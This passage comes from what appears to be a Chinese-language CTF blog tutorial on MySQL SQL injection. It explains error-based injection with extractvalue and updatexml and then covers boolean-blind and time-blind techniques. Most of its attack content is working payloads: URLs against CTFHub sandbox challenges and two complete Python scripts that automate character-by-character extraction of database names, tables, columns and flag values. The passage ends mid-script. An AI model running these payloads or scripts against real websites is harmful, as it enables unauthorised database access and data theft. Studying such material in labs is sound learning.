  <pre class="line-numbers language-none"><code class="language-none">select username,password from user;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240429224729.png"></p>
</li>
</ol>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><ol>
<li>extractvalue():从目标xml中返回包含所查询的字符串</li>
<li>EXTRACTVALUE(XML_document,XPath_string)</li>
<li>第一个参数：XML_document是String格式，为XML文档对象的名称</li>
<li>第二个参数：Xpath_string(xpath格式的字符串)</li>
<li>concat:返回结果为连接参数产生的字符串</li>
</ol>
<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><ol>
<li>updatexml(xml_document,xpath_string,new_value)</li>
<li>第一个参数：xml_document是string格式，为xml文档对象的名称</li>
<li>第二个参数：xpath_string</li>
<li>第三个参数：new_value,string格式，替换查找到符合条件的数据</li>
</ol>
<h4 id="用database-爆数据库"><a href="#用database-爆数据库" class="headerlink" title="用database()爆数据库"></a>用database()爆数据库</h4><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><ol>
<li>information_schema.tables所有表名</li>
<li>information_schema.columns所有列名</li>
</ol>
<h1 id="table"><a href="#table" class="headerlink" title="table"></a>table</h1><ol>
<li>table_schema=’数据库名字’,数据库的名称</li>
<li>table_name=’表的名字’,查询满足某些条件的表名</li>
<li>table_type表的类型</li>
</ol>
<h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue函数原理"><a href="#extractvalue函数原理" class="headerlink" title="extractvalue函数原理"></a>extractvalue函数原理</h3><ol>
<li>对xml文件进行查询的函数，会从xml文件中返回所包含查询值的字符串，语法：<pre class="line-numbers language-none"><code class="language-none">extractvalue(&#39;xml_document&#39;,&#39;Xpath_string&#39;)
extractvalue(&#39;目标文件名&#39;,&#39;在xml中查询的字符串&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>第二个参数要求是xpath格式的字符串，语法正确是会按照路径 <strong>/该xml文件/要查询的字符串</strong> 进行查询 </li>
<li>如果我们输入的Xpath_string不对就会报错，而如果页面回显sql报错信息就可以得到我们想要的信息了，<strong>0x7e是~，是不属于xpath语法的格式</strong>，因此会爆出xpath语法错误</li>
<li>此处的xml_document可以是anything，<strong>填1是因为没有文件名为1的xml文件</strong></li>
</ol>
<h3 id="而如果页面回显sql报错信息就可以得到我们想要的信息了"><a href="#而如果页面回显sql报错信息就可以得到我们想要的信息了" class="headerlink" title="而如果页面回显sql报错信息就可以得到我们想要的信息了"></a>而如果页面回显sql报错信息就可以得到我们想要的信息了</h3><ol>
<li>  注意必须是XPATH的error，不是syntax的error</li>
<li>  即必须是xpath路径错误，不能是语法错误</li>
<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240430150734.png"></li>
</ol>
<h3 id="拼接方法"><a href="#拼接方法" class="headerlink" title="拼接方法"></a>拼接方法</h3><ol>
<li>使用concat函数（将两个或多个字符串合并成一个字符串）拼接一个错误的Xpath让mysql报错得到包含查询值的字符串<pre class="line-numbers language-none"><code class="language-none">select(extractvalue(1,concat(0x7e,database)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>修改database()部分可以爆表，列，值</li>
<li>concat存在的意义就是让extractvalue函数的第二个参数出错，所以concat拼接的参数是个非法字符就行</li>
</ol>
<h4 id="extractvalue函数一次只能查询32长度"><a href="#extractvalue函数一次只能查询32长度" class="headerlink" title="extractvalue函数一次只能查询32长度"></a>extractvalue函数一次只能查询32长度</h4><ol>
<li>所以在爆表，列，值的时候需要加上limit x,1逐一查询（<strong>limit m,n跳过前m项数据后获取n条记录</strong>）<pre class="line-numbers language-none"><code class="language-none">假设有三列
select 1,2,(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &#39;security&#39; limit 0,1&#x2F;1,1&#x2F;2,1))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ol>
<h5 id="例题ctfshow报错注入"><a href="#例题ctfshow报错注入" class="headerlink" title="例题ctfshow报错注入"></a>例题ctfshow报错注入</h5><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-cd4501bf2d967240.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and extractvalue(1,concat(0x7e,database())) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://s2.loli.net/2022/06/30/L6tXebY2BRmcihF.png"></p>
<ol start="2">
<li><p>当有多行数据时，一定要limit控制有几行输出，最好一行一行输出</p>
</li>
<li><p><img src="https://s2.loli.net/2022/06/30/AofUYCxwuaN87Sl.png"></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;sqli&#39; limit 0,1)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p><a target="_blank" rel="noopener" href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag’ limit 0,1)))–+</p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1))) –+<br><img src="https://s2.loli.net/2022/06/30/CIZz2LtPobcvmsf.png"></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select flag from flag limit 1,1))) –+</p>
</li>
<li><p>然后就爆完了 ctfhub{a6bceb2015a931e029a2d182</p>
</li>
</ol>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
<li><p>所谓盲注就是在服务器没有错误回显的时候完成注入攻击。</p>
</li>
<li><p>原理：boolean 根据注入信息返回true or false 没有任何报错信息</p>
</li>
<li><p>即布尔盲注一般适用于页面没有回显字段(不支持联合查询)，<strong>且web页面返回True或者false</strong>，构造SQL语句，<strong>利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false</strong>，从而达到注入的目的来<strong>获取信息</strong>的一种方法</p>
</li>
<li><p>逐位判断使用substring函数，第一个参数是列的名字，第二个参数是起始位置，第三个参数是截取的长度</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> SUBSTRING<span class="token punctuation">(</span>column_name<span class="token punctuation">,</span> position<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> single_character
<span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ol>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre class="line-numbers language-none"><code class="language-none">playload：and length(database()) &#x3D;8 --+ &#x2F;判断数据库名长度
是否等于8
如果不等于
则返回错，并且返回index.php
如果等于就返回query_success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>如果是错误，会回显报错</li>
<li>如果是正确的，会返回开始页面</li>
</ol>
<h3 id="例题：ctfhub布尔盲注"><a href="#例题：ctfhub布尔盲注" class="headerlink" title="例题：ctfhub布尔盲注"></a>例题：ctfhub布尔盲注</h3><ol>
<li><p>这一道题我看其它人的wp是数据库为空时还会返回空，一般情况下是数据库为空或者查询语句报错时都会报错，所以应该先判断空时是否会报错?id=1 and 0=1 –+</p>
</li>
<li><p><strong>判断数据库名字的长度</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 3 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></p>
</li>
<li><p><strong>判断数据库名字的长度</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 4 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></p>
</li>
<li><p><strong>逐位判断</strong>数据库的名字，使用substring函数</p>
</li>
</ol>
  <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-d1fc647b75cf070a.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and substring(database(),1,1) &#x3D; &#39;s&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="5">
<li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240430160159.png"></p>
</li>
<li><p><strong>判断数据库名字</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and database() = ‘sqli’ –+<br><img src="https://s2.loli.net/2022/06/30/Y9RJbZPQgTdApBn.png"></p>
</li>
<li><p><strong>判断数据库中表的名字</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select table_name from information_schema.tables where table_schema=’sqli’ limit 0,1) = ‘flag’ –+ <strong>这个地方加limit 0,1是因为不只有一个表</strong><br><img src="https://s2.loli.net/2022/06/30/1CJVp3ueS5MZlbf.png"></p>
</li>
<li><p><strong>判断flag表中字段的名字</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select column_name from information_schema.columns where table_name=’flag’ limit 0,1) = ‘flag’ –+<br><img src="https://s2.loli.net/2022/06/30/rXfJiRvAY9UZT62.png"></p>
</li>
<li><p>后面实在是写不出来了，就跑一下吧</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
import time

urlOPEN &#x3D; &#39;http:&#x2F;&#x2F;challenge-80bbba4d1e9ce716.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;&#39;
starOperatorTime &#x3D; [] 
mark &#x3D; &#39;query_success&#39;
 
def database_name():
	name &#x3D; &#39;&#39;
	for j in range(1,9):
		for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:
			url &#x3D; urlOPEN+&#39;if(substr(database(),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(j,i)
			# print(url+&#39;%23&#39;)
			r &#x3D; requests.get(url)
			if mark in r.text:
				name &#x3D; name+i
				
				print(name)
				
				break
	print(&#39;database_name:&#39;,name)
	
		
	
database_name()
 
def table_name():
    list &#x3D; []
    for k in range(0,4):
        name&#x3D;&#39;&#39;
        for j in range(1,9):
            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:
                url &#x3D; urlOPEN+&#39;if(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)
			    # print(url+&#39;%23&#39;)
                r &#x3D; requests.get(url)
                if mark in r.text:
                    name &#x3D; name+i
                    break
        list.append(name)
    print(&#39;table_name:&#39;,list)

#start &#x3D; time.time()
table_name()
#stop &#x3D; time.time()
#starOperatorTime.append(stop-start)
#print(&quot;所用的平均时间： &quot; + str(sum(starOperatorTime)&#x2F;100))

def column_name():
    list &#x3D; []
    for k in range(0,3): #判断表里最多有4个字段
        name&#x3D;&#39;&#39;
        for j in range(1,9): #判断一个 字段名最多有9个字符组成
            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:
                url&#x3D;urlOPEN+&#39;if(substr((select column_name from information_schema.columns where table_name&#x3D;&quot;flag&quot;and table_schema&#x3D; database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)
                r&#x3D;requests.get(url)
                if mark in r.text:
                    name&#x3D;name+i
                    break
        list.append(name)
    print (&#39;column_name:&#39;,list)

column_name()

def get_data():
        name&#x3D;&#39;&#39;
        for j in range(1,50): #判断一个值最多有51个字符组成
            for i in range(48,126):
                url&#x3D;urlOPEN+&#39;if(ascii(substr((select flag from flag),%d,1))&#x3D;%d,1,(select table_name from information_schema.tables))&#39; %(j,i)
                r&#x3D;requests.get(url)
                if mark in r.text:
                    name&#x3D;name+chr(i)
                    print(name)
                    break
        print (&#39;value:&#39;,name)
    
get_data()
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>最后用这个脚本跑出来了</p>
<h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><pre class="line-numbers language-none"><code class="language-none">一.
1.count()函数：统计查询结果的数量；
2.length(str)函数：返回字符串 str的长度；
3.left()函数： left(database(),1)&#x3D;‘s’ left(a,b)从左侧截取a的前b位，正确则返回1，错误返回0
left((select database()),1)&#x3D;‘s’ 同样的意思
4.regexp : select user() regexp ‘r’; user()的结果是root@localhost，regexp为匹配root的正则表达式
5.like : select user() like ‘ro%’; 匹配与regexp相似
6.substr(a,b,c): select substr() xxxx; substr(a,b,c)从位置b开始，截取a字符串的c位长度
7.mid(a,b,c): select mid(user(),1,2); mid(a,b,c)从位置b开始，截取a字符串的c位长度
8.ascii() 将某个字符转化为其ascii值
9.limit 0,1：元素索引是从0开始（不是1） 从元素索引位置为1的数据（即第2位）开始输出一个值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol>
<li>由于服务器端拼接了SQL语句，且<strong>正确和错误存在同样的回显</strong>，即是错误信息被过滤，可以通过<strong>页面响应时间进行按位判断数据</strong>。由于时间盲注中的函数是在数据库中执行的，但是sleep函数或者benchmark函数的过多执行会让服务器负载过高</li>
</ol>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
<li>通过一个页面加载的时间延时来判断</li>
<li>但是这和网络，性能，设置的延时长短有关系</li>
<li>当对数据库进行查询操作，如果查询的条件不存在，语句执行的速度非常快，执行时间基本可以认为是0，通过控制sql语句的执行时间来判断</li>
<li>我认为就是后端设置，当不设置延时的时候，语句执行就会非常快，执行时间基本可以认为是0</li>
</ol>
<h3 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h3><h4 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h4><h4 id="if-exp1-exp2-exp3"><a href="#if-exp1-exp2-exp3" class="headerlink" title="if(exp1,exp2,exp3)"></a>if(exp1,exp2,exp3)</h4><ol>
<li>当exp1的值为true时会执行exp2,否则会执行exp3</li>
</ol>
<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><ol>
<li>睡眠函数，可以使查询数据时回显数据的相应时间加长</li>
<li>sleep(N) 这里N是睡眠的时间</li>
<li>使用时可以配合if使用<pre class="line-numbers language-none"><code class="language-none">if(ascii(substr(user(),1,1)) &#x3D; 114,sleep(5),2) 这句话的意思是，如果user()中的第一个字符的ascii码为114时，睡眠5s，否则输出2，需要注意的是，这5s是在服务器的数据库中延迟的，实际情况可能会由于网络环境等因素延迟更长时间<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<h4 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h4><ol>
<li>benchmark函数原本是用来重复执行某个语句的函数</li>
<li>benchmark(N,expression)</li>
<li>N是执行的次数，expression是表达式，如果需要进行盲注，通常需要进行消耗时间和性能的计算，例如哈希计算函数MD5，将MD5函数重复执行数万次则可以达到延迟的效果，而具体的情况需要根据不同比赛的服务器性能来决定</li>
</ol>
<h3 id="ascii码对照表"><a href="#ascii码对照表" class="headerlink" title="ascii码对照表"></a>ascii码对照表</h3><ol>
<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240429103404.png"></li>
</ol>
<h3 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h3><h4 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h4><ol>
<li><p>和1=2返回页面相同，说明不是布尔盲注，是时间盲注</p>
<pre class="line-numbers language-none"><code class="language-none">1&#39; and 1&#x3D;1 --+ 页面返回有数据
1&#39; and 1&#x3D;2 --+ 页面返回也有数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><p>判断可以使用的注入方法</p>
<pre class="line-numbers language-none"><code class="language-none">sleep()判断能否利用时间盲注
1&#39; and sleep(5) --+ 页面延时了，则为时间盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><p>猜数据库名称长度</p>
<pre class="line-numbers language-none"><code class="language-none">1&#39; and if(length(database()) &#x3D; 10,sleep(5),1) --+ 页面延时了，则当前数据库名称长度为10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>猜测数据库名称(ASCII码)</p>
<pre class="line-numbers language-none"><code class="language-none">1&#39; and if(ascii(substr(database()))&#x3D;107,sleep(5),1) --+ 如果页面延时了，则第一个字符的ascii码值为107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<h3 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h3><ol>
<li>判断长度<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1) --+ 如果页面窗口转了10s，说明长度为8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>猜测字符（<strong>数据库名</strong>第一位）<br>?id=1’ and if(mid(database(),1,1)=’s’,10,0) –+ 如果页面跳转了10s，说明database的第一个字符为s</li>
<li>猜测字符(<strong>猜测第一个表名</strong>的第一位)</li>
</ol>
<h3 id="例题-ctfhub时间盲注"><a href="#例题-ctfhub时间盲注" class="headerlink" title="例题:ctfhub时间盲注"></a>例题:ctfhub时间盲注</h3><ol>
<li><p>判断数据库名字长度<br><img src="https://s2.loli.net/2022/07/02/HZmto3NRM4vAlcS.png"></p>
</li>
<li><p>用二分法逐个字符判断数据库名字，例如这个地方先判断了第一个字符是s，（<strong>ascii(s) = 115</strong>）<br><img src="https://s2.loli.net/2022/07/02/ONKdQMlPenB8YoE.png"><br><img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></p>
</li>
<li><p>判断数据库中表的个数</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;sqli&#39;) &#x3D; 2,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></p>
</li>
<li><p>逐个字符判断数据库中表的名字，(此处ascii(f) = 102)</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 102,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://s2.loli.net/2022/07/02/fOi4p3JN1MxbqGH.png"></p>
</li>
<li><p>猜测flag表的字段数</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(column_name) from information_schema.columns where table_name &#x3D; &#39;flag&#39;) &#x3D; 1,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>脚本全部代码</p>
  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote

base_url <span class="token operator">=</span> <span class="token string">"http://challenge-8b83743abf473c1b.sandbox.ctfhub.com:10800/?id="</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span> <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://challenge-59668c27594f7541.sandbox.ctfhub.com:10800/"</span><span class="token punctuation">,</span> <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">get_database_length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    length <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if(length(database()) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
        url <span class="token operator">=</span> base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span> <span class="token comment">#很重要，因为id中有许多特殊字符，比如#，需要进行url编码</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"database length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"failed!"</span><span class="token punctuation">)</span>
            length<span class="token operator">+=</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"database length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库名的长度为"</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>
    <span class="token keyword">return</span> length

<span class="token keyword">def</span> <span class="token function">get_database</span><span class="token punctuation">(</span>database_length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    database <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> database_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span> <span class="token comment">#神奇的申明方法</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
            id_equal <span class="token operator">=</span> <span class="token string">"1 and if(ascii(substr(database(), "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_equal<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                id_bigger <span class="token operator">=</span> <span class="token string">"1 and if(ascii(substr(database(), "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) > "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_bigger<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                    r <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">-</span> <span class="token number">1</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    l <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                database <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"目前已知数据库名"</span><span class="token punctuation">,</span> database<span class="token punctuation">)</span>
                <span class="token keyword">break</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库名为"</span><span class="token punctuation">,</span> database<span class="token punctuation">)</span>
    <span class="token keyword">return</span> database

<span class="token keyword">def</span> <span class="token function">get_table_num</span><span class="token punctuation">(</span>database<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    num <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select count(table_name) from information_schema.tables where table_schema = '"</span> <span class="token operator">+</span> database <span class="token operator">+</span> <span class="token string">"') = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
